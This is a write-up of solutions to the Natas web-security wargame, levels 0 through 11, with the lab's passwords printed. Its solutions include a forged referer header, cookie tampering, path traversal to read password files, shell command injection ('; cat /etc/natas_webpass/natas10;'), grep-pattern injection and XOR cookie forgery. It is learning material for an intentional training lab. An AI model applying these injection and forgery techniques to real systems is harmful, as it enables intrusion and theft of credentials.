# Natas
This repository holds my solutions to the wargame natas.

## Level 0
Looking in the source we can see the comment:
```
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```
Password: gtVrDuiDfck831PqWsLEZy5gyDz1clto

## Level 1
We can use the shortcut 'CTRL+U' to access the source and find the comment:
```
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```
Password: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

## Level 2
Looking in the source we see that a picture called pixels is stored in the directory files. Going to http://natas2.natas.labs.overthewire.org/files/ we can see the file users.txt which holds the password.

Password: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

## Level 3
Looking in the source we can see the comment: `<!-- No more information leaks!! Not even Google will find it this time... -->`. The only way google won't find it is if it's path was stored in the robots.txt file. Visiting it, then going to http://natas3.natas.labs.overthewire.org/s3cr3t/ results in the password.

Password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

## Level 4
We can use a curl command to change the http referer. Running `curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/index.php` results in the password.

Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

## Level 5
Changing the cookie loggedin from 0 to 1 results in the password.

Password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

## Level 6
Looking at the php in the source after clicking the view source button we can see that the secret is stored in http://natas6.natas.labs.overthewire.org/includes/secret.inc. Visiting the url and submitting the secret results in the password.

Password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

## Level 7
The site reads a file that we can control the name of. Looking in the source we can see that the password is stored in `/etc/natas_webpass/natas8`. Going to the url `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8` results in the password.

Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

## Level 8
The secret has been base64 encoded, reversed, then encoded in hex. We can use the following line of python to decode it `import base64; base64.b64decode(bytearray.fromhex("3d3d516343746d4d6d6c315669563362").decode()[::-1])` and get the secret `oubWYf2kBq`. Submitting the secret we get the password.

Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

## Level 9
We can inject a linux command using `; COMMAND HERE ;`. Inputting `; cat /etc/natas_webpass/natas10;` results in the password.

Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

## Level 10
We can use the regular expression `.*` to match anything. If we use it then add the name of the file containing the password, then comment the rest of the expression we get the password. We can use this command to do that: `.* /etc/natas_webpass/natas11 #`

Password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

## Level 11
The first thing we have to do is create a script that XORs two strings.
```
def xor(str1, str2):
	assert(len(str1)==len(str2))
	return ''.join([chr(ord(str1[i])^ord(str2[i])) for i in range(len(str1))])
```
The json encoded data should look like this: `{"showpassword":"no","bgcolor":"#ffffff"}`. Due to the easy reversibility of XOR we can find the key by XORing the string above and the cookie. Running: `xor(base64.b64decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=").decode(), "{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}")` gives us the key, `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`. 

Now we can XOR the json data we need to solve the challenge, `{"showpassword":"yes","bgcolor":"#ffffff"}`, with the key to get the cookie needed to get the password. We have to extend the key to make it equal in size to the json data.
```
>>> x = xor("qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw", "{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}")
>>> base64.b64encode(bytes(x, 'utf-8'))
b'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'
```
Changing the cookie data to `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK` results in the password.

Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

## Level 12
